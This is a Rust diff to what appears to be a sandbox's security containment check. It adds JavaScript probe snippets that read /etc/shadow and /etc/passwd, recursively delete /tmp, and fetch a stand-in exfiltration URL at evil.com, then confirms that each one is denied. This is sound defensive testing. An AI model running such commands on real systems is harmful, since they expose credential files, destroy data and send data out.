@@ -320,20 +320,66 @@ pub(crate) fn run_security_containment_checks() -> Result<usize> {
         blocked += 1;
     }
 
-    let v2_bc = compile_source_to_bytecode("const s = fs.readFileSync(\"/etc/shadow\");");
-    let caps2 = CapabilityToken::pure_compute().with_read_prefix("/app/safe");
-    let mut iso2 = SliceIsolate::spawn("attacker-2", 2, caps2, 1000, 65536);
+    let v2_snp_bc = compile_source_to_bytecode("const s = fs.readFileSync(\"/etc/shadow\");");
+    let v2_boa_read_bc = compile_source_to_bytecode(
+        "const fs = require(\"node:fs\"); fs.readFileSync(\"/etc/passwd\", \"utf8\");",
+    );
+    let v2_boa_rm_bc = compile_source_to_bytecode(
+        "const fs = require(\"node:fs\"); fs.rmSync(\"/tmp\", { recursive: true, force: true });",
+    );
+    let mut iso2_snp = SliceIsolate::spawn(
+        "attacker-2a",
+        2,
+        CapabilityToken::pure_compute(),
+        5000,
+        262144,
+    );
+    let mut iso2_default_read = SliceIsolate::spawn(
+        "attacker-2b",
+        2,
+        CapabilityToken::pure_compute(),
+        5000,
+        262144,
+    );
+    let mut iso2_default_rm = SliceIsolate::spawn(
+        "attacker-2c",
+        2,
+        CapabilityToken::pure_compute(),
+        5000,
+        262144,
+    );
+    let caps2_scoped = CapabilityToken::pure_compute().with_read_prefix("/app/safe");
+    let mut iso2_scoped = SliceIsolate::spawn("attacker-2d", 2, caps2_scoped, 5000, 262144);
     if matches!(
-        iso2.execute_bytecode(&v2_bc, None),
+        iso2_snp.execute_bytecode(&v2_snp_bc, None),
+        Err(SandboxViolation::FsReadDenied { .. })
+    ) && matches!(
+        iso2_default_read.execute_bytecode(&v2_boa_read_bc, None),
+        Err(SandboxViolation::FsReadDenied { .. })
+    ) && matches!(
+        iso2_default_rm.execute_bytecode(&v2_boa_rm_bc, None),
+        Err(SandboxViolation::FsWriteDenied { .. })
+    ) && matches!(
+        iso2_scoped.execute_bytecode(&v2_boa_read_bc, None),
         Err(SandboxViolation::FsReadDenied { .. })
     ) {
         blocked += 1;
     }
 
     let v3_bc = compile_source_to_bytecode("const r = fetch(\"https://evil.com/exfil\");");
+    let mut iso3_default = SliceIsolate::spawn(
+        "attacker-3a",
+        3,
+        CapabilityToken::pure_compute(),
+        5000,
+        262144,
+    );
     let caps3 = CapabilityToken::pure_compute().with_net_host("db.internal:5432");
-    let mut iso3 = SliceIsolate::spawn("attacker-3", 3, caps3, 1000, 65536);
+    let mut iso3 = SliceIsolate::spawn("attacker-3b", 3, caps3, 5000, 262144);
     if matches!(
+        iso3_default.execute_bytecode(&v3_bc, None),
+        Err(SandboxViolation::NetAccessDenied { .. })
+    ) && matches!(
         iso3.execute_bytecode(&v3_bc, None),
         Err(SandboxViolation::NetAccessDenied { .. })
     ) {
